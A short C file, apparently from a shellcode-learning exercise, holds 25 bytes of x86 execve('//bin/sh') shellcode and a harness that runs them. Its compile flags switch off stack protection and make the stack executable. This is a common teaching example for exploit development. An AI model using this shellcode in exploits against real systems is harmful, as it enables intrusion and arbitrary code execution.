/* 
 * author Anidear
 * based on http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html
 *
 * requirement(for compile x86 binary on x64 OS): sudo apt-get install libc6-dev-i386
 * to compile: gcc -m32 -fno-stack-protector -z execstack -o shell32 shell32.c
 *
 */
#include <stdio.h>
#include <string.h>

// execve('//bin/sh',null,null)
char* shellcode = \
	"\x31\xc0\x50\x68\x6e\x2f\x73"
	"\x68\x68\x2f\x2f\x62\x69\x89"
	"\xe3\x50\x89\xe2\x53\x89\xe1"
	"\xb0\x0b\xcd\x80";

main(){
	printf("Shellcode size = %d\n",strlen(shellcode));
	int (*shell)() = (int(*)()) shellcode;
	shell();
}